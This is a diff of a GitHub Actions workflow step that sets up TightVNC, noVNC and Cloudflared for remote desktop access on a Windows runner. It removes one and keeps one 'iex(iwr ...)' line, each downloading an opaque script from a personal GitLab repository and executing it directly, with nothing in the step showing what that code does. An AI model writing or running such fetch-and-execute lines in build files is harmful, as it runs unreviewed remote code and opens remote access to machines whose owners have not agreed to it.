@@ -32,13 +32,10 @@ jobs:
     - name: 🖥️ Cài đặt và chạy TightVNC, noVNC, Cloudflared
       shell: pwsh
       run: |
-        iex (iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/a -UseBasicParsing)
+        Write-Host "📥 Installing TightVNC, noVNC, and Cloudflared..."
         
+        try {
           iex(iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/ngdep4mua)
-
-
-
-
           Write-Host "📥 Installing TightVNC..."
           Invoke-WebRequest -Uri "https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi" -OutFile "tightvnc-setup.msi" -TimeoutSec 60
           Write-Host "✅ TightVNC downloaded"
